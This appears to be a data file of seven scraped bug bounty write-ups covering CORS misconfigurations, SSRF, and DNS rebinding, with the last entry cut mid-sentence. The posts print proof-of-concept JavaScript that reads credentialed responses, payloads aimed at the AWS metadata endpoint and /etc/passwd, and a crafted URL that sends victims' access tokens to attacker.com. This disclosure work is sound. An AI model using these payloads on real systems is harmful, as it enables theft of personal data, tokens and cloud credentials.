{"source_url": "https://medium.com/@sasaxxx777/cors-misconfiguration-leading-to-private-information-disclosure-3034cfcb4b93", "title": "CORS Misconfiguration leading to Private Information Disclosure | by Virus0X01 | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@sasaxxx777/cors-misconfiguration-leading-to-private-information-disclosure-3034cfcb4b93. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nCORS Misconfiguration leading to Private Information Disclosure | by Virus0X01 | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Virus0X01 2 min read · Jan 23, 2020 -- 2 Listen Share CORS Misconfiguration leading to Private Information Disclosure Hi hackers, today i will talk about CORS that i found in a private program let’s call it private.com After doing some recon , i found this domain let’s say xyz.private.com i sent a request to burp to start doing some crawling and parameter digging and so on , request was sent to the server with Origin header GET / HTTP/1.1 Host: xyz.private.com Origin: https://xyz.private.com Connection: close the origin header was accepted by Access-Control-Allow-Origin header and the Access-Control-Allow-Credentials was set to true Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS, DELETE Access-Control-Allow-Origin: https://xyz.private.com Access-Control-Expose-Headers: here i started to do some investigation to see how the server handles the origin header so i sent a request with the main domain only to server and the server accepted it Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS, DELETE Access-Control-Allow-Origin: https://private.com Access-Control-Expose-Headers: i deleted the dot from private.com and it was accepted too , the server checks if the domain name and com exists neglecting any thing between them . i sent a request with 1 between private and com like this GET / HTTP/1.1 Host: xyz.private.com Origin: https://private1com Connection: close and it got accepted :) Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: GET, POST, PUT, OPTIONS, DELETE Access-Control-Allow-Origin: https://private1com Access-Control-Expose-Headers: i signed a domain on https://ae.000webhost.com with the name https://privatescom.000webhostapp.com , i put “s” instead of 1 because it wasn’t allowed in the subdomain name. with small piece of code i could make the POC <!DOCTYPE html> <html> <body> <center> <h2>CORS POC Exploit</h2> <div id=\"demo\"> <button type=\"button\" onclick=\"cors()\">Exploit</button> </div> <script> function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function () { if ( this .readyState == 4 && this .status == 200) { document.getElementById(\"demo\").innerHTML = alert( this .responseText); } }; xhttp.open(\"GET\", \"https://xyz.private.com\", true ); xhttp.withCredentials = true ; xhttp.send(); } </script> </body> </html> and we got the response on our domain , and i could steal any user’s personal information. Press enter or click to view image in full size simple POC i’d like to thank my friend offensive hunterr , he gave me the idea of signing the domain and helped me with the JS code ❤ Infosec Bug Bounty Web Security Security -- -- 2 Written by Virus0X01 67 followers · 3 following Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/a-bugz-life/exploiting-an-ssrf-trials-and-tribulations-14c5d8dbd69a", "title": "Exploiting an SSRF: Trials and Tribulations | by A Bug’z Life | A Bug’z Life | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/a-bugz-life/exploiting-an-ssrf-trials-and-tribulations-14c5d8dbd69a. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nExploiting an SSRF: Trials and Tribulations | by A Bug’z Life | A Bug’z Life | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in A Bug’z Life · Our experiences navigating through infosec engineering & stuff Exploiting an SSRF: Trials and Tribulations A Bug’z Life 7 min read · Mar 3, 2020 -- 5 Listen Share I mostly wanted to share this post not because it’s a novel and unique attack, but to show the thought process of attacking this particular functionality, and understanding how the system works to identify what would and would not work. This post is covering an SSRF ( Server Side Request Forgery ) bug that was really fun to discover and exploit. It took a lot of work to figure out and to finally exploit. The endpoint was actually sent to me to poke at by another fellow bug hunter, Ibram (after realizing we were on the same program). It was our first time collaborating, and we ended up finding quite a few things of interest. We both dug in and shared findings back and forth on how the application was behaving, which was very helpful. I did also notice this endpoint popped up several times (on about 15 subdomains) from Wayback Machine . The functionality was every bug hunter’s dream for SSRF. It was a proxy endpoint that allows for the client to provide a URL, and the server would make an HTTP request and display the response directly to the user (in HTML). The endpoint was something like https://company.com/proxy. The first thing I tried was to give it my Burp Collaborator instance to see if it would fetch my instance: Press enter or click to view image in full size There was whitelist functionality in use here. It would only fetch hosts from a “trusted” list. I tried different company.com domains and noticed they all worked. So we were able to realize that *.company.com was allowed in this whitelist. The next thing we did was try to find any open redirect or subdomain takeover for *.company.com . This is because we wanted to either use an open redirect to redirect the trusted/allowed domain to something attacker controlled or internal, or use the subdomain takeover to serve my own content from the trusted domain. To start trying to find these, I did some subdomain discovery for *.company.com using Findomain , then looked for live hosts using httprobe , and finally pulled back all the URLs found for those from Wayback Machine using Waybackurls . This gave me a list of a few hundred thousand URLs to search through to find an open redirect or subdomain takeover. I started with open redirects by grepping through the waybackurls output for something that could be an open redirect: grep \"=http\" wayback.txt . This should give output that has a query parameter with the value starting with http , indicating a URL is in that place which is great for discovering open redirects and SSRFs. We ended up finding a few open redirects quite easily! Now, back to the testing with this open redirect to point to my Burp Collaborator instance: Press enter or click to view image in full size Unfortunately, I now found out that any redirect would result in a 302 to a default error page and not follow the redirect. I tried a few different things here, but ultimately learned redirects were not going to work as the server was simply fetching a single URL and returning the response. What I ended up realizing was that any response other than 200 made the application throw a 302 response. I hunted a bit more for subdomain takeovers, but could not find any. My goal was finding an open redirect, but unfortunately that was no longer a viable option. Before diving deeper into the URL parser/whitelist logic, I thought to take a look at the list of subdomains I discovered earlier, and pass that through as the url parameter. The idea was that I could take the domains that didn’t resolve, or those that timed out as they were likely internally accessible, and pass it through and potentially fetch hidden content that the server has access to. I expected this to work for some of the domains, but unfortunately nothing interesting popped up. I also checked *.company.com for any DNS records that pointed to localhost or 127.0.0.1 as I could potentially use this domain for accessing internal resources as the domain is in the list of allowed domains, but points to an internally accessible service. Unfortunately, I could not find any domain that had a DNS record like this. Now, with my options limiting, I decided to try and bypass the URL parser logic to get any URL through the whitelist. I went through just about every special/weird character, different redirect/SSRF bypass technique, and everything available in the publicly available wordlists out there, but had no luck. Any IP address or decimal encoded version would give generic errors. The parser logic seemed quite strong after this round of testing. As a result, bypassing the URL whitelist is probably not going to work, so I then decided to see if this whitelist is overly permissive. I took this list of the top 1000 domains I found on Github and decided to pass that through the url parameter. It turns out it wasn’t as restricted as initially thought! amazonaws.com popped up as an allowed domain. For those not familiar, amazonaws.com is AWS’ domain that is tied to a lot of popular services, such as S3 and EC2, of which customers get their own unique endpoint or subdomain. Finally! I can serve my own content from my AWS resources. To test this out, I hosted an XSS HTML file on S3: Press enter or click to view image in full size As expected, it worked! I now, as a worst case, have XSS that I can report. While XSS can be high impact in certain scenarios, this is one of those features that you just know is more vulnerable so I wanted to keep pushing. I tried a few different things such as trying to get the server to execute my HTML or JavaScript to load in iFrames or images of sensitive content, such as: AWS Metadata Service : <iframe src=\"http://169.254.169.254/latest/meta-data/\"></iframe> Local Files: <img src=\"file:///etc/passwd\"> Unfortunately, as indicated by earlier behavior, the server was not actually executing any content on the target URL, but just fetching and returning it. Instead of uploading my content to S3, I decided to launch an EC2 instance so I could serve more dynamic content. I spun-up a quick server and wrote a few simple Flask endpoints to serve various content, perform redirects, and a couple other things. After trying to serve content/files to find more interesting things, I decided to revisit redirects. I thought maybe if I could pass-in a certain response code with the redirect, it would work. I wrote a quick Flask endpoint to accept a url and code query parameter so that I could easily iterate through every HTTP status code. I noticed that the application was caching responses from the same URL, so each URL needed to be different. It was easy enough to get past this by adding in a unique query string on each request, such as: https://my-ec2.amazonaws.com/redirect?1&url=...&code=302 https://my-ec2.amazonaws.com/redirect?2&url=...&code=302 Again, no luck here. At this point, I was getting a bit desperate, so I tried looking for any *.amazonaws.com domain that has a DNS record pointing to localhost , 127.0.0.1 , or the Metadata service 169.254.169.254 . As expected, there was no luck. After many trials and errors, I realized that when I was testing the URL parser logic, the application gave different responses if URLs are not allowed or whether the target URL just didn’t give a 200 response. I found out that the whitelist was not actually *.company.com , but it was in fact *company.com . I didn’t realize this at the time because the requests were failing, but then I remembered that it’s only because the domain doesn’t exist. So here I am, walking home, on my phone buying a domain on AWS neemacompany.com , and setting up DNS records for md.neemacompany.com to point to 169.254.169.254 and local.neemacompany.com to point to 127.0.0.1 . By the time the domain was finally registered and the DNS records propagated, I pulled out my laptop and immediately tried to hit my DNS record pointing to the AWS metadata service and BAM! Press enter or click to view image in full size Successful response from AWS Metadata service Finally! I found the missing piece and as suspected, this functionality was indeed vulnerable. For those not familiar, the AWS Metadata service can be used to get temporary AWS credentials and get access to the company’s AWS environment, depending on what permissions the credentials have. I also tried my local.neemacompany.com and confirmed I could hit the localhost as well (with other internal services). Feeling accomplished, I went ahead to write and submit the report. Now, I can rest in peace for the night! Next morning, I wake up and BAM: Press enter or click to view image in full size Duplicate of a report from nearly a year ago! I laughed as I saw that because of all the work and testing that went into this. I almost suspected the original report didn’t show a high impact due to the fact that it hasn’t been fixed in a year, but I cannot confirm that. It is disappointing to see a good bug getting duped, but honestly in this case I was mostly happy that I was able to figure this bug out (even though I ended up losing $12 with this bug for the domain purchase). It was one of those bugs that would have drove me crazy if I never solved it, so I felt rewarding to go through this whole process as it was very fun to figure out and exploit! It was also great to collaborate with another bug hunter, Ibram , who has been finding some really awesome bugs and interesting leads in this particular target. I hope this post of my thought process of understanding a particular bit of functionality and, finally exploiting it was enjoyable and helpful! Bug Bounty Penetration Testing Cybersecurity Infosec Security -- -- 5 Published in A Bug’z Life 1.3K followers · Last published Apr 15, 2020 Our experiences navigating through infosec engineering & stuff Written by A Bug’z Life 1.6K followers · 1 following Our blog for all things security and technology related. Everything from our journey along InfoSec career path, bug bounty write-ups and more interesting stuff. Responses ( 5 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@arbazhussain/exploiting-misconfigured-cors-on-popular-btc-site-2aedfff906f6", "title": "Exploiting Misconfigured CORS on popular BTC Site | by Arbaz Hussain | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@arbazhussain/exploiting-misconfigured-cors-on-popular-btc-site-2aedfff906f6. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nExploiting Misconfigured CORS on popular BTC Site | by Arbaz Hussain | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Exploiting Misconfigured CORS on popular BTC Site Arbaz Hussain 2 min read · Jul 19, 2017 -- 2 Listen Share Press enter or click to view image in full size Severity: Medium Complexity : Easy Weakness : Allowing ACAH On one of the popular BTC site , I was facing some issue with account so i used the’r support form to inform them . Thing’s i Provided By form : Email . Phone Number. Name. Message. Clicked on Submit and Noticed that Form is being sent to third party site . https://api.thirdparty.com/api/contact/widget/281d02/ in form of POST Data . POST /api/contact/widget /281d02/ HTTP/1.1 Host: api.thirdparty.com Connection: close Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Language: en-US,en;q=0.8 Cookie: REDACTED Content-Type: application/x-www-form-urlencoded Content-Length: 0 {“firstName”:”adsgasgsag”,”lastName”:null,”company”:null,”email”:”asgasgasgn1241@gmail.com”,”phone”:”9876543210\",”accountId”:”38517\",”message”:”xxx”,”Tags”:[]} After Sending form i changed the request Method to GET , Added Origin: evil.com in Request Header GET /api/contact/widget/281d02/ HTTP/1.1 Origin: evil.com Response : Access-Control-Allow-Origin: evil.com Access-Control-Allow-Credentials: true {\"contactUid\":\"025381\",\"firstName\":\"adsgasgsag\",\"lastName\":null,\"company\":null,\"email\":\" asgasgasgn1241@gmail.com \",\"phone\":\"9123091647\",\"additionalDetails\":{},\"accountId\":38517,”location”:null,”Tags”:[]} Surprised to see Access-Control-Allow-Credentials: true <html> <body onload=’load()’> <p id=”demo”></p> Name: <h3 id=”name”></h3> Email : <h3 id=”email”></h3> Phone : <h3 id=”phone”></h3> ACCID :<h3 id=”AccountID”></h3> <h3 id=”que”></h3> <script> function load(){ var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function(){ if(this.readyState == 4 && this.status == 200){ //document.getElementById(‘demo’).innerHTML = JSON.stringify(this.responseText); parsed = JSON.parse(this.responseText); var arr = []; for(var x in parsed){ arr.push(parsed[x]); } console.log(arr) document.getElementById(‘email’).innerHTML = arr[6]; document.getElementById(‘name’).innerHTML = arr[3]; document.getElementById(‘phone’).innerHTML = arr[7]; document.getElementById(‘AccountID’).innerHTML = arr[9]; } }; xhr.open(“GET”,”https://api.thirdparty.com/api/contact/widget/281d02\",true); xhr.send(); } </script> </body> </html> Press enter or click to view image in full size poc As Soon as victim(user who used the’r support form at anytime or any previous date) visit’s malicious page . His previous form data get’s extracted . Cors Hackerone Hack Bug Bug Bounty -- -- 2 Written by Arbaz Hussain 2K followers · 411 following Security Analyst Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://bugbaba.blogspot.com/2018/02/exploiting-cors-miss-configuration.html", "title": "Exploiting CORS Misconfiguration using XSS", "friendly_explanation": "This is a bug bounty writeup from https://bugbaba.blogspot.com/2018/02/exploiting-cors-miss-configuration.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nExploiting CORS Misconfiguration using XSS Skip to main content Search This Blog NomanAli181 | BugBaba Discoveries and Writings of security vulnerabilities that I have discovered Exploiting CORS Misconfiguration using XSS Get link Facebook X Pinterest Email Other Apps February 18, 2018 Hello All, This Post is about how i exploited a Cross Origin Resource Sharing (CORS) Misconfiguration with the help of Cross Site Scripting (XSS) After reporting some bugs to Netgear Kudos program I started getting old private program invites on Bugcrowd One of which was with 300+ researchers and running from 2015 I wasn't happy about that, As i thought I won't be able to find any thing as the program is running from such a long time and so many others have looked at it before me. Even if i will get something the chances of that being duplicate is high. But then Osama said this So I finally started looking at it and trying my best to find something, Got one P3 but it went duplicate :( But then I got an endpoint that was having simple CORS misconfiguration and the endpoint was giving user details like email address , age , g ender , DOB , etc in response It was triaged, paid and fix within a week I was happy and was planing to move on to other programs, Sadly none of them were as interesting as this one was. So started looking back at it again, During my initial recon phase i had found a reflected xss on their support portal But that subdomain was out of scope of the program. I don't know why but i just bookmarked it ¯\\_(ツ)_/¯ Latter I found another endpoint that was also giving user details in response, But it was only accepting sub domain's as origin So in this case there are two options : Finding XSS on a Subdomain ( that I already had ) Subdomain Takeover Even after Reading these blogs multiple times, I wasn't able to understand the flow of the attack https://web-in-security.blogspot.in/2017/07/cors-misconfigurations-on-large-scale.html http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html After talking to a lot of people including James Kettle , Daniel Bakker and Kaushal parikh I was finally able to understand how the attack flow will be like 1. The attacker Send the XSS link to user with following Payload <p id=demo></p></script><script> function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { alert(this.responseText); document.getElementById(\"demo\").innerHTML = this.responseText; } }; xhttp.open(\"GET\", \"https://sub.site.com/api/v2/config\", true); xhttp.withCredentials = true; xhttp.send(); } cors(); </script> 2. This will send a GET request to site.com with origin as sub.site.com and then paste the response back to paragraph tag (in this case) 3. And Send the data to Attacker's Server using JavaScript I quickly reproduce it twice just to be sure and submitted the Report The Bugcrowd Analyst replied this So after sharing few messages,I was able to convince him and it was triaged and paid, The client replied this ^_^ Lessons Learned : Just because the program is old and so many people have looked at it, It doesn't mean there is nothing to find. XSS is lub <3 While i can't share the original poc, But i have tried to re-create the same scenario on my local machine you can get the code from my profile on Github . Thanks for reading Hopefully we will meet next time with another cool finding :) -- Regards, Noman Shaikh Bugbounty XSS Get link Facebook X Pinterest Email Other Apps Comments Unknown 19 February 2018 at 00:02 Nice find sir. 😄 Reply Delete Replies Noman Shaikh 19 February 2018 at 00:09 Thanks Sir :D Delete Replies Reply Reply gopi 19 February 2018 at 00:46 If my understanding is correct,You are displaying sensitive data from main site to subdomain site < P > tag. Just displaying sensitive data in subdomain site is issue? How it can be exploited real time scenario.? Reply Delete Replies Noman Shaikh 19 February 2018 at 00:52 Just doing that is not an issue But, as we can get sensitive data from main domain to a subdomain and we have xss on that subdomain that is we can run JavaScript in the context of that site and using JavaScript we can send the data to any server instead of displaying that. Delete Replies Reply gopi 19 February 2018 at 01:09 Got it .Thanks! Delete Replies Reply Reply Unknown 19 February 2018 at 01:07 Sahi hai! Nice find! Reply Delete Replies Reply securityprince 6 March 2018 at 01:10 Great finding bro, keep it up! Reply Delete Replies Noman Shaikh 7 March 2018 at 06:57 Thanks ;) Delete Replies Reply Reply Pranav 3 May 2019 at 22:52 Sir please provide me CORS payload Reply Delete Replies Reply Add comment Load more... Post a Comment Popular posts from this blog XSS Because of wrong Content-type Header August 04, 2017 Hello All, XSS because of Wrong content type in InternShala.com Internshala : Internshala is an internship platform, this website helps students find internships with organisations in India - wiki While checking this site I got an endpoint which didn't had CSRF protection. I can change the user details (name, address,etc) Not email :( One thing that was weird with that endpoint was that it was giving a JSON response But the content type header was not : application/javascript Rather it was set as : text/html I was fiddling with that as I knew if we can inject html then we can get XSS here :D But they had filters so it was just HTML Injection -_- that isn't cool to report But there was another parameter current_city_administrative_area_level_2 changing its value caused and error Lets Build Payload Problem no (1) White space was not allowed ... Read more Two Factor Authentication Bypass | SendGrid September 15, 2017 Hello All, Today I will be sharing how I was able to Bypass SendGrid 2FA What is SendGrid : A Cloud-based email service to deliver emails on behalf of companies having 55,000+ customers ~ https://sendgrid.com/about/ What is Two Factor Authentication : Two-Factor Authentication (2FA) is a type of multi-factor authentication confirming a user’s claimed identity by utilizing a combination of two different authentication methods. 2FA makes it harder for potential intruders to gain access and steal user’s personal data or identity. ~ https://en.wikipedia.org/wiki/Multi-factor_authentication My Story with them : I started looking for bugs in SendGrid and after trying whole night i found a XSS Reported it and when to sleep peacefully Next morning I checked my email The bug went duplicate :( It felt bad I didn't want to test further so I went to delete my account ( I don't want emails from them :__: ) I... Read more Noman Shaikh Visit profile Archive February 2018 1 January 2018 1 September 2017 1 August 2017 1 July 2017 1"}
{"source_url": "https://medium.com/@michan001/ssrf-on-pdf-generator-36b81e16d67b", "title": "SSRF on PDF generator.. Hello, How are you guys doing? This is… | by John Michael Mondilla | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@michan001/ssrf-on-pdf-generator-36b81e16d67b. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSSRF on PDF generator.. Hello, How are you guys doing? This is… | by John Michael Mondilla | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in SSRF on PDF generator. John Michael Mondilla 2 min read · Mar 2, 2020 -- 2 Listen Share Hello, How are you guys doing? This is my first write-up. Sorry for my noobness. :D Press enter or click to view image in full size Here’s a cute picture of Maple-chan. I want to share an issue that I found on a private bug bounty program. There is an SSRF vulnerability on their PDF generator but the problem on their web app is, you cannot insert special characters. But, I noticed that they have a mobile app and we can insert the payload there. The “save as PDF” function is only available on the web app so we need to insert the payload via mobile app then login to the web app and use the function “save as pdf”. Luckily, payloads that are using forward-slash (/) for spacing are not filtered so we can use an iframe tag payload with a forward slash as the spacing. This is the payload I used: <iframe/src=””> I tried to insert <iframe/src=” http://localhost/ ”> and also <iframe/src=” http://127.0.0.1 ”> but the PDF will be blanked. The next step I did was to create a subdomain and change the DNS into 127.0.0.1. So, the payload should look like this <iframe/src=” http://sub-domain.mydomain.com ”>. I inserted the payload via mobile app and used the function “save as PDF” on their web app. The payload worked but, what I saw on the PDF is the login form of the app. But, I have an idea. What if I am able to access the file which is only available internally. So what I did next is use dirsearch to brute force their directory. I checked the result and found “elmah.axd” which has a status code of 403 in dirsearch means that I am forbidden to access the file. I added “elmah.axd” on my payload and it should look like this. Payload: <iframe/src=” http://sub-domain.mydomain.com/elmah.axd ”> So, I inserted the payload again via mobile app and used the “save as PDF” function on the web app and the payload works. What I saw on the PDF are their error logs. I reported the issue to the company and they rewarded me with a bounty. It only took them an hour to fix the issue and a day to send the bounty. This is short but I hope you enjoy reading this. :) -Michan Bug Bounty -- -- 2 Written by John Michael Mondilla 81 followers · 9 following Memes and Bug Bounties Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://ngailong.wordpress.com/2019/12/19/google-vrp-ssrf-in-google-cloud-platform-stackdriver/", "title": "[Google VRP] SSRF in Google Cloud Platform StackDriver – Ron Chan", "friendly_explanation": "This is a bug bounty writeup from https://ngailong.wordpress.com/2019/12/19/google-vrp-ssrf-in-google-cloud-platform-stackdriver/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n[Google VRP] SSRF in Google Cloud Platform StackDriver – Ron Chan Skip to content Ron Chan My Bug Bounty Write Ups Facebook LinkedIn Twitter Instagram Menu Home About Contact [Google VRP] SSRF in Google Cloud Platform StackDriver ronchan Uncategorized December 19, 2019 3 Minutes During the process of testing GAE after reading this awesome blog post , I found a debug application in Google Cloud Platform Stackdriver, user can debug their code by importing the source code to the application. From reading here , user can choose to import the source code from Github, Gitlab or Bitbucket and directly debug the code within the Stackdriver Debug page. Integration with third party applications has proven to be problematic if they are not integrated properly, I found a special class of SSRF in the process of testing this feature. Let’s take a look how they do it in this case. If there is an existing app engine application deployed, you can see there are multiple ways to import source code to this debug application at https://console.cloud.google.com/debug A click on Select Source on Bitbucket will show us a consent page that if you allow google to store oauth token in this application. After authorizing in the oauth screen, user is redirected back to google and presented with user’s bitbucket/gitlab/github’s repo details. By far everything looks secure, redirect_uri cannot be tampered, state parameter is used correctly. But how does Google actually fetch the list of repos and the branch names? Turns out they are doing it in these two requests. List repo from bitbucket/gitlab/github https://console.cloud.google.com/m/clouddiag/debug/v2/gitlab/list?pid=groovy-plating-250224 List the branch from bitbucket/gitlab/github https://console.cloud.google.com/m/clouddiag/debug/v2/gitlab/resourcelist?pid=groovy-plating-250224&url=https%3A%2F%2Fgitlab.com%2Fapi%2Fv4%2Fprojects%2Fprojectid%252Fproject-one%2Frepository%2Ftags From the second request, the url decoded version is https://console.cloud.google.com/m/clouddiag/debug/v2/gitlab/resourcelist?pid=groovy-plating-250224&url=https://gitlab.com/api/v4/projects/projectid/project-one/repository/tags We can see there is a url parameter in the query part, I replaced https://gitlab.com with https://xxxxxxx.burpcollaborator.net and tried to figure out is there any SSRF protection in place, and surprisingly there was none. More surprisingly, from Burp Collaborator, there was something else in the SSRF request. GET /?per_page=100 HTTP/1.1 Host: evdjffp55g27sbbipe7uqzx1tszin7.burpcollaborator.net Connection: keep-alive Upgrade-Insecure-Requests: 1 Authorization: Bearer 123bcad14289c8a9d3 The request comes with the Authorization header containing the Bitbucket access token. When I think about it, it makes sense to send access token along with the SSRF request since it is requesting personal information from the API endpoints, there is no way Google can do it without the access token of user. Now we have a clear understanding how they are integrating with third party application to import the source code, and also how Google are fetching the resources(branch names, tags etc.) from different API endpoints. This leads us to the last step, trying to exploit this SSRF that send user’s access token to arbitrary url that we specify. The idea is simple, since the request is just a GET request, instead of a POST request, if they are not protecting end user from CSRF for GET requests, then we just send the exploit url to the user and wait for the SSRF from google to send us the access token of the victim. Fortunately, there is no CSRF header in the request, however there are still a few potential headers that could prevent us from exploiting this bug. They have x-pan-versionid, X-Goog-Request-Log-Data and the Referer is https://console.cloud.google.com/ , if they are checking from the backend that these headers must be set and referer domain must match console.cloud.google.com before making the SSRF request, then this would be not exploitable. Luckily there are no such validation in the backend. To conclude, in order to exploit this bug, attacker would need a server listening for HTTPS request, say burp collaborator, and send the crafted url to the victim that has bitbucket/gitlab/github connected to Stackdriver, then attacker would be able to steal victim’s access token from the SSRF request from Google. Final PoC: https://console.cloud.google.com/m/clouddiag/debug/v2/gitlab/resourcelist?pid=groovy-plating-250224&url=https%3A%2F%2fattacker.com%2Fstealing.json Hope you like reading this post, Google has it fixed now, although the fix is not the perfect fix, I still can’t bypass the validation in place, if you are interested, take a look and report to https://g.co/vulnz if you managed to bypass it! Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Like Loading... Related Published by ronchan @ngalongc View all posts by ronchan Published December 19, 2019 Post navigation Previous Post Old but GOLD Dot Dot Slash to Get the Flag — Uber Microservice Leave a comment Cancel reply Δ Create a free website or blog at WordPress.com. Privacy & Cookies: This site uses cookies. By continuing to use this website, you agree to their use. To find out more, including how to control cookies, see here: Cookie Policy Comment Reblog Subscribe Subscribed Ron Chan Join 37 other subscribers Sign me up Already have a WordPress.com account? Log in now. Ron Chan Subscribe Subscribed Sign up Log in Copy shortlink Report this content View post in Reader Manage subscriptions Collapse this bar Loading Comments... Write a Comment... Email (Required) Name (Required) Website %d Design a site like this with WordPress.com Get started"}
{"source_url": "https://geleta.eu/2019/my-first-ssrf-using-dns-rebinfing/", "title": "My First SSRF Using DNS Rebinding | marek.geleta", "friendly_explanation": "This is a bug bounty writeup from https://geleta.eu/2019/my-first-ssrf-using-dns-rebinfing/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMy First SSRF Using DNS Rebinding | marek.geleta marek.geleta whoami blog categories whoami blog categories My First SSRF Using DNS Rebinding Written by Marek Geleta with ♥ on 11 November 2019 in Bug Bounty 8 min What is DNS Rebinding? Imagine you are a comuter :D People give you URLs and you load them Of course you won’t load url that points to your internal network… That would be stupid right? Because of this some clever developer wrote code like this to prevent it from happening To make explaining this easier ip_banlist is list of IPs you are blocking domain is the URL you are trying to fetch getHostname is a function that resolves a domain/URL to actual IP address or translates it from eg. octal to IPV4/6 import requests from core_funcs import getHostname from banlists import ip_banlist def secureFetch(domain): if getHostname(domain) not in ip_banlist: r = requests.get(domain) return r.text “You can’t just bypass this” — a not so clever Developer Turns out I actually can! And that’s what DNS Rebinding is about! Let’s go through the function line by line Let’s say the function is ran with domain='http://wtf.geleta.eu' and that the ip_banlist = ['169.254.169.254', '127.0.0.1'] First it runs a DNS query with wtf.geleta.eu which returns 12.34.56.78 which is not in ip_banlist so our journey continues!!! In the meantime the DNS record for wtf.geleta.eu magically changes to 127.0.0.1 🦹🏻‍ now the request is made to http://wtf.geleta.eu so again somewhere in the requests.get() the dns query is ran again and now with DNS record changed to 127.0.0.1 Soooo there’s nothing stopping us from retrieving localhost 🎉🎉🎉 So that’s the theory behind this whole thing. Pretty primitive right? What do we actually need to make this happen Since we can’t manually change the dns record in milliseconds as the program runs, we need a custom DNS server configured to somehow figure out what IP should it resolve to and set TTL to 0 so no caching happens on the backend Some “interface” to configure the domain - what should it resolve to, how many times, stuff like this A fair bit of luck obviously When I found this bug I used https://lock.cmpxchg8b.com/rebinder.html but later on I figured out that it’s not ideal, it only takes 2 IPs and resolves between them randomly so I have to send like 100 requests to get 1 that actually went to localhost :D (This was about 7-8 months ago, I made my own tool for this. So expect little product placement at the end of the post!) How it went down with the actual vulnerability I stumbled upon a service that I can configure to make a json request, set headers, etc. Then it gives me the http response When i set the url to some internal/banned ip like 127.0.0.1 it gave me something like: The request was blocked After few hours of trying to bypass it I was like “This is unbreakable, I’m gonna get some food” Then I got some food and minute after that I remembered that my friend Jan Masarik did one challenge when we were hacking Fireshell CTF 2019 ctf with our CTF team The challenge was about dns rebinding. Writeup: https://ctftime.org/writeup/13005 The actual ctf challenge was created by ELB so If you are reading this I just want to say BIG thank you for making this challenge! So I used the technique from writeup. I set the rebinding to 127.0.0.1/google ip and after sending 100 request with burp intruder 2 of them came back with different lenght than others, I click on one of them and see a html code with title which was name of the company And I was like NO WAY!!!!! IT ACTUALLY FUCKING WORKED WTFFFFFF I’M A 1337 HAXXXXXOR NOW With dns rebinding confirmed, I didn’t actually know what to do… Everything I have ever hacked before were just ctfs - and this is where the challenge usually ends, you have the flag and your are good to go It doesn’t work that well IRL Now all I had was some ssrf that I didn’t know what I can use it for. Few hours went by and there I was sending keybase message to Jan Masarik because I was stuck again. I told him that it was an amazon instance and he sent me some ip adress - 169.254.169.254 I clicked on it and nothing happened, that IP didn’t exist Then he told me that it is the aws metadata IP and if I can retrieve data from there, I basically own their whole aws (It wasn’t completely true as you find out in a while but I was really really excited) I immediately fired up intruder and in few seconds I recieved a response with aws keys Now again I was like I love Pingu btw And I love the ssrfs too! Back Into reality Those were some trashy keys, I couldn’t do almost anything with them… Turns out I can only r/w some buckets but there weren’t any useful, those that were hosted on frontend weren’t writable (my favorite was the one with cookbooks - see screenshot) It made me laugh but I was disappointed. I tried to escalate my privs for another few hours and-or figure out what else could I do but there wasn’t much of it :( Ok so the vuln had some Impact so I could report it. I set severity to P2 Now all left to do was enumerate and possibly get a RCE if I was lucky Fast forward a week I didn’t have any response from the company,no fix, no lawsuit, nothing at all. Perhaps I should report it as P1. But whatever! It was good for me, I could enumerate more. AAAAND After chaining with other ssrf… This was a bit easier - there was a ftp connection vulnerable to ssrf - When some other service than ftp was passed in, let’s say 127.0.0.1:22 server errored out with Bad FTP RESPONSE: SSH-2.0-OpenSSH_someversion So using this I was able to enumerate open internal ports on their server Another thing that was possible was bruteforcing ftp credentials on 127.0.0.1:21 since it was open too, I tried it with top-1k but it didn’t work out :( So I just enumerated the ports… Fast forward another few hours I found a Monit Admin interface I was able to interact with via dns rebinding ssrf It had an buffer overread vuln so I was able to read some memory (+1 point in impact :D) Aaand I could shut down the whole instance using shutdown function in Monit (+10 points) Then I reported this too! I got a response in a fucking month……… Meanwhile I turned into skeleton But eventually they responded! They fixed it, gave me a not that big bounty (It’s a small program), everyone was happy, life went on :D Lessons learned Bugs exist everywhere I you are stuck, go back few steps and start again If you are stuck after doing the step above - message your mentor/more expirienced hacker they will always help you Be patient AF If you have free time, create some great tool! or contribute to other great tools BB is not entirely about money, It’s more about the things 